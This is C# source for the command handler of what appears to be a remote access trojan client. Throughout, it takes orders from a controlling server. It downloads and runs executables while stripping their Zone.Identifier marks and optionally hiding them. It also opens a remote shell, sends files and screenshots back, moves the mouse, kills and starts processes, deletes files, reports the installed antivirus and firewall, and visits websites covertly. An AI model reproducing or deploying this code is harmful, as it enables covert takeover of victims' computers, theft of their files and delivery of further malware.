using Client;
using Core.RemoteShell;
using System;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;

namespace Core.Commands
{
	public class CommandHandler
	{
		[DllImport("kernel32", CharSet = CharSet.Unicode, SetLastError = true)]
		[return: MarshalAs(UnmanagedType.Bool)]
		private static extern bool DeleteFile(string name);
		[DllImport("user32.dll")]
		private static extern bool SetCursorPos(int x, int y);
		[DllImport("user32.dll")]
		private static extern void mouse_event(int dwFlags, int dx, int dy, int cButtons, int dwExtraInfo);

		private static Bitmap lastDesktopScreenshot = null;
		private static Shell shell = null;

		private const int MOUSEEVENTF_LEFTDOWN = 0x02;
		private const int MOUSEEVENTF_LEFTUP = 0x04;
		private const int MOUSEEVENTF_RIGHTDOWN = 0x08;
		private const int MOUSEEVENTF_RIGHTUP = 0x10;

		public static void HandleInitializeCommand(Core.Packets.ServerPackets.InitializeCommand command, Core.Client client)
		{
			SystemCore.InitializeGeoIp();
			new Core.Packets.ClientPackets.Initialize(Settings.VERSION, SystemCore.OperatingSystem, SystemCore.AccountType, SystemCore.Country, SystemCore.CountryCode, SystemCore.Region, SystemCore.City, SystemCore.ImageIndex).Execute(client);
		}

		public static void HandleDownloadAndExecuteCommand(Core.Packets.ServerPackets.DownloadAndExecute command, Core.Client client)
		{
			new Core.Packets.ClientPackets.Status("Downloading file...").Execute(client);

			new Thread(new ThreadStart(() =>
			{
				string tempFile = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), Helper.GetRandomFilename(12, ".exe"));

				try
				{
					using (WebClient c = new WebClient())
					{
						c.Proxy = null;
						c.DownloadFile(command.URL, tempFile);
					}
				}
				catch
				{
					new Core.Packets.ClientPackets.Status("Download failed!").Execute(client);
					return;
				}

				new Core.Packets.ClientPackets.Status("Downloaded File!").Execute(client);

				try
				{
					DeleteFile(tempFile + ":Zone.Identifier");

					var bytes = File.ReadAllBytes(tempFile);
					if (bytes[0] != 'M' && bytes[1] != 'Z')
						throw new Exception("no pe file");

					ProcessStartInfo startInfo = new ProcessStartInfo();
					if (command.RunHidden)
					{
						startInfo.WindowStyle = ProcessWindowStyle.Hidden;
						startInfo.CreateNoWindow = true;
					}
					startInfo.UseShellExecute = command.RunHidden;
					startInfo.FileName = tempFile;
					Process.Start(startInfo);
				}
				catch
				{
					DeleteFile(tempFile);
					new Core.Packets.ClientPackets.Status("Execution failed!").Execute(client);
					return;
				}

				new Core.Packets.ClientPackets.Status("Executed File!").Execute(client);
			})).Start();
		}

		public static void HandleUninstall(Core.Packets.ServerPackets.Uninstall command, Core.Client client)
		{
			new Core.Packets.ClientPackets.Status("Uninstalling... bye ;(").Execute(client);

			if (Settings.STARTUP)
			{
				if (SystemCore.AccountType == "Admin")
				{
					try
					{
						Microsoft.Win32.RegistryKey key = Microsoft.Win32.Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", true);
						if (key != null)
						{
							key.DeleteValue(Settings.STARTUPKEY, true);
							key.Close();
						}
					}
					catch
					{
						// try deleting from Registry.CurrentUser
						Microsoft.Win32.RegistryKey key = Microsoft.Win32.Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", true);
						if (key != null)
						{
							key.DeleteValue(Settings.STARTUPKEY, true);
							key.Close();
						}
					}
				}
				else
				{
					try
					{
						Microsoft.Win32.RegistryKey key = Microsoft.Win32.Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", true);
						if (key != null)
						{
							key.DeleteValue(Settings.STARTUPKEY, true);
							key.Close();
						}
					}
					catch
					{ }
				}
			}

			string filename = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), Helper.GetRandomFilename(12, ".bat"));
			
			string uninstallBatch = (Settings.INSTALL && Settings.HIDEFILE) ? 
					"@echo off" + "\n" +
					"echo DONT CLOSE THIS WINDOW!" + "\n" +
					"ping -n 15 localhost > nul" + "\n" +
					"del /A:H " + "\"" + SystemCore.MyPath + "\"" + "\n" +
					"del " + "\"" + filename + "\""
				:
					"@echo off" + "\n" +
					"echo DONT CLOSE THIS WINDOW!" + "\n" +
					"ping -n 15 localhost > nul" + "\n" +
					"del " + "\"" + SystemCore.MyPath + "\"" + "\n" +
					"del " + "\"" + filename + "\""
				;

			File.WriteAllText(filename, uninstallBatch);
			ProcessStartInfo startInfo = new ProcessStartInfo();
			startInfo.WindowStyle = ProcessWindowStyle.Hidden;
			startInfo.CreateNoWindow = true;
			startInfo.UseShellExecute = true;
			startInfo.FileName = filename;
			Process.Start(startInfo);

			SystemCore.Disconnect = true;
			client.Disconnect();
		}

		public static void HandleRemoteDesktop(Core.Packets.ServerPackets.Desktop command, Core.Client client)
		{
			if (lastDesktopScreenshot == null)
			{
				lastDesktopScreenshot = Helper.GetDesktop(command.Mode, command.Number);

				byte[] desktop = Helper.CImgToByte(lastDesktopScreenshot, System.Drawing.Imaging.ImageFormat.Jpeg);

				new Core.Packets.ClientPackets.DesktopResponse(desktop).Execute(client);

				desktop = null;
			}
			else
			{
				Bitmap currentDesktopScreenshot = Helper.GetDesktop(command.Mode, command.Number);

				Bitmap changesScreenshot = Helper.GetDiffDesktop(lastDesktopScreenshot, currentDesktopScreenshot);

				lastDesktopScreenshot = currentDesktopScreenshot;

				byte[] desktop = Helper.CImgToByte(changesScreenshot, System.Drawing.Imaging.ImageFormat.Png);

				new Core.Packets.ClientPackets.DesktopResponse(desktop).Execute(client);

				desktop = null;
				changesScreenshot = null;
				currentDesktopScreenshot = null;
			}
		}

		public static void HandleGetProcesses(Core.Packets.ServerPackets.GetProcesses command, Core.Client client)
		{
			Process[] pList = Process.GetProcesses();
			string[] processes = new string[pList.Length];
			int[] ids = new int[pList.Length];
			string[] titles = new string[pList.Length];

			int i = 0;
			foreach (Process p in pList)
			{
				processes[i] = p.ProcessName + ".exe";
				ids[i] = p.Id;
				titles[i] = p.MainWindowTitle;
				i++;
			}

			new Core.Packets.ClientPackets.GetProcessesResponse(processes, ids, titles).Execute(client);
		}

		public static void HandleKillProcess(Core.Packets.ServerPackets.KillProcess command, Core.Client client)
		{
			try
			{
				Process.GetProcessById(command.PID).Kill();
			}
			catch
			{ }

			HandleGetProcesses(new Core.Packets.ServerPackets.GetProcesses(), client);
		}

		public static void HandleStartProcess(Core.Packets.ServerPackets.StartProcess command, Core.Client client)
		{
			ProcessStartInfo startInfo = new ProcessStartInfo();
			startInfo.UseShellExecute = true;
			startInfo.FileName = command.Processname;
			Process.Start(startInfo);

			HandleGetProcesses(new Core.Packets.ServerPackets.GetProcesses(), client);
		}

		public static void HandleDrives(Core.Packets.ServerPackets.Drives command, Core.Client client)
		{
			new Core.Packets.ClientPackets.DrivesResponse(System.Environment.GetLogicalDrives()).Execute(client);
		}

		public static void HandleDirectory(Core.Packets.ServerPackets.Directory command, Core.Client client)
		{
			try
			{
				DirectoryInfo dicInfo = new System.IO.DirectoryInfo(command.RemotePath);

				FileInfo[] iFiles = dicInfo.GetFiles();
				DirectoryInfo[] iFolders = dicInfo.GetDirectories();

				string[] files = new string[iFiles.Length];
				long[] filessize = new long[iFiles.Length];
				string[] folders = new string[iFolders.Length];

				int i = 0;
				foreach (FileInfo file in iFiles)
				{
					files[i] = file.Name;
					filessize[i] = file.Length;
					i++;
				}
				if (files.Length == 0)
				{
					files = new string[] { "$$$EMPTY$$$$" };
					filessize = new long[] { 0 };
				}

				i = 0;
				foreach (DirectoryInfo folder in iFolders)
				{
					folders[i] = folder.Name;
					i++;
				}
				if (folders.Length == 0)
					folders = new string[] { "$$$EMPTY$$$$" };

				new Core.Packets.ClientPackets.DirectoryResponse(files, folders, filessize).Execute(client);
			}
			catch
			{
				new Core.Packets.ClientPackets.DirectoryResponse(new string[] { "$$$EMPTY$$$$" }, new string[] { "$$$EMPTY$$$$" }, new long[] { 0 }).Execute(client);
			}
		}

		public static void HandleDownloadFile(Core.Packets.ServerPackets.DownloadFile command, Core.Client client)
		{
			try
			{
				byte[] bytes = File.ReadAllBytes(command.RemotePath);
				new Core.Packets.ClientPackets.DownloadFileResponse(Path.GetFileName(command.RemotePath), bytes, command.ID).Execute(client);
			}
			catch
			{ }
		}

		public static void HandleMouseClick(Core.Packets.ServerPackets.MouseClick command, Core.Client client)
		{
			if (command.LeftClick)
			{
				SetCursorPos(command.X, command.Y);
				mouse_event(MOUSEEVENTF_LEFTDOWN, command.X, command.Y, 0, 0);
				mouse_event(MOUSEEVENTF_LEFTUP, command.X, command.Y, 0, 0);
				if (command.DoubleClick)
				{
					mouse_event(MOUSEEVENTF_LEFTDOWN, command.X, command.Y, 0, 0);
					mouse_event(MOUSEEVENTF_LEFTUP, command.X, command.Y, 0, 0);
				}
			}
			else
			{
				SetCursorPos(command.X, command.Y);
				mouse_event(MOUSEEVENTF_RIGHTDOWN, command.X, command.Y, 0, 0);
				mouse_event(MOUSEEVENTF_RIGHTUP, command.X, command.Y, 0, 0);
				if (command.DoubleClick)
				{
					mouse_event(MOUSEEVENTF_RIGHTDOWN, command.X, command.Y, 0, 0);
					mouse_event(MOUSEEVENTF_RIGHTUP, command.X, command.Y, 0, 0);
				}
			}
		}

		public static void HandleGetSystemInfo(Core.Packets.ServerPackets.GetSystemInfo command, Core.Client client)
		{
			try
			{
				string[] infoCollection = new string[20];
				infoCollection[0] = "Processor (CPU)";
				infoCollection[1] = SystemCore.GetCpu();
				infoCollection[2] = "Memory (RAM)";
				infoCollection[3] = string.Format("{0} MB", SystemCore.GetRam());
				infoCollection[4] = "Video Card (GPU)";
				infoCollection[5] = SystemCore.GetGpu();
				infoCollection[6] = "Username";
				infoCollection[7] = SystemCore.GetUsername();
				infoCollection[8] = "PC Name";
				infoCollection[9] = SystemCore.GetPcName();
				infoCollection[10] = "Uptime";
				infoCollection[11] = SystemCore.GetUptime();
				infoCollection[12] = "LAN IP Address";
				infoCollection[13] = SystemCore.GetLanIp();
				infoCollection[14] = "WAN IP Address";
				infoCollection[15] = SystemCore.WANIP;
				infoCollection[16] = "Antivirus";
				infoCollection[17] = SystemCore.GetAntivirus();
				infoCollection[18] = "Firewall";
				infoCollection[19] = SystemCore.GetFirewall();
				new Core.Packets.ClientPackets.GetSystemInfoResponse(infoCollection).Execute(client);
			}
			catch
			{ }
		}

		public static void HandleVisitWebsite(Core.Packets.ServerPackets.VisitWebsite command, Core.Client client)
		{
			string url = command.URL;

			if (!url.StartsWith("http"))
				url = "http://" + url;

			if (Uri.IsWellFormedUriString(url, UriKind.RelativeOrAbsolute))
			{
				if (!command.Hidden)
					Process.Start(url);
				else
				{
					try
					{
						HttpWebRequest Request = (HttpWebRequest)HttpWebRequest.Create(url);
						Request.UserAgent = "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.114 Safari/537.36";
						Request.AllowAutoRedirect = true;
						Request.Timeout = 10000;
						Request.Method = "GET";
						HttpWebResponse Response = (HttpWebResponse)Request.GetResponse();
						Stream DataStream = Response.GetResponseStream();
						StreamReader reader = new StreamReader(DataStream);
						reader.Close();
						DataStream.Close();
						Response.Close();
					}
					catch
					{ }
				}

				new Core.Packets.ClientPackets.Status("Visited Website").Execute(client);
			}
		}

		public static void HandleShowMessageBox(Core.Packets.ServerPackets.ShowMessageBox command, Core.Client client)
		{
			MessageBox.Show(null, command.Text, command.Caption, (MessageBoxButtons)Enum.Parse(typeof(MessageBoxButtons), command.MessageboxButton), (MessageBoxIcon)Enum.Parse(typeof(MessageBoxIcon), command.MessageboxIcon));
			new Core.Packets.ClientPackets.Status("Showed Messagebox").Execute(client);
		}

		public static void HandleUpdate(Core.Packets.ServerPackets.Update command, Core.Client client)
		{
			// i dont like this updating... if anyone has a better idea feel free to edit it
			new Core.Packets.ClientPackets.Status("Downloading file...").Execute(client);

			new Thread(new ThreadStart(() =>
			{
				string tempFile = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), Helper.GetRandomFilename(12, ".exe"));

				try
				{
					using (WebClient c = new WebClient())
					{
						c.Proxy = null;
						c.DownloadFile(command.DownloadURL, tempFile);
					}
				}
				catch
				{
					new Core.Packets.ClientPackets.Status("Download failed!").Execute(client);
					return;
				}

				new Core.Packets.ClientPackets.Status("Downloaded File!").Execute(client);

				new Core.Packets.ClientPackets.Status("Updating...").Execute(client);

				try
				{
					DeleteFile(tempFile + ":Zone.Identifier");

					var bytes = File.ReadAllBytes(tempFile);
					if (bytes[0] != 'M' && bytes[1] != 'Z')
						throw new Exception("no pe file");

					string filename = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), Helper.GetRandomFilename(12, ".bat"));

					string uninstallBatch = (Settings.INSTALL && Settings.HIDEFILE) ?
							"@echo off" + "\n" +
							"echo DONT CLOSE THIS WINDOW!" + "\n" +
							"ping -n 15 localhost > nul" + "\n" +
							"del /A:H " + "\"" + SystemCore.MyPath + "\"" + "\n" +
							"move " + "\"" + tempFile + "\"" + " " + "\"" + SystemCore.MyPath + "\"" + "\n" +
							"start \"\" " + "\"" + SystemCore.MyPath + "\"" + "\n" +
							"del " + "\"" + filename + "\""
						:
							"@echo off" + "\n" +
							"echo DONT CLOSE THIS WINDOW!" + "\n" +
							"ping -n 15 localhost > nul" + "\n" +
							"del " + "\"" + SystemCore.MyPath + "\"" + "\n" +
							"move " + "\"" + tempFile + "\"" + " " + "\"" + SystemCore.MyPath + "\"" + "\n" +
							"start \"\" " + "\"" + SystemCore.MyPath + "\"" + "\n" +
							"del " + "\"" + filename + "\""
						;

					File.WriteAllText(filename, uninstallBatch);
					ProcessStartInfo startInfo = new ProcessStartInfo();
					startInfo.WindowStyle = ProcessWindowStyle.Hidden;
					startInfo.CreateNoWindow = true;
					startInfo.UseShellExecute = true;
					startInfo.FileName = filename;
					Process.Start(startInfo);

					SystemCore.Disconnect = true;
					client.Disconnect();
				}
				catch
				{
					DeleteFile(tempFile);
					new Core.Packets.ClientPackets.Status("Update failed!").Execute(client);
					return;
				}
			})).Start();
		}

		public static void HandleMonitors(Core.Packets.ServerPackets.Monitors command, Core.Client client)
		{
			new Core.Packets.ClientPackets.MonitorsResponse(Screen.AllScreens.Length).Execute(client);
		}

		public static void HandleShellCommand(Core.Packets.ServerPackets.ShellCommand command, Core.Client client)
		{
			if (shell == null)
				shell = new Shell();

			string input = command.Command;

			if (input == "exit")
				CloseShell();
			else
				shell.ExecuteCommand(input);
		}

		public static void CloseShell()
		{
			if (shell != null)
			{
				shell.CloseSession();
				shell = null;
			}
		}

		public static void HandleRename(Core.Packets.ServerPackets.Rename command, Core.Client client)
		{
			try
			{
				if (command.IsDir)
					Directory.Move(command.Path, command.NewPath);
				else
					File.Move(command.Path, command.NewPath);

				HandleDirectory(new Core.Packets.ServerPackets.Directory(Path.GetDirectoryName(command.NewPath)), client);
			}
			catch
			{ }
		}

		public static void HandleDelete(Core.Packets.ServerPackets.Delete command, Core.Client client)
		{
			try
			{
				if (command.IsDir)
					Directory.Delete(command.Path, true);
				else
					File.Delete(command.Path);

				HandleDirectory(new Core.Packets.ServerPackets.Directory(Path.GetDirectoryName(command.Path)), client);
			}
			catch
			{ }
		}
	}
}
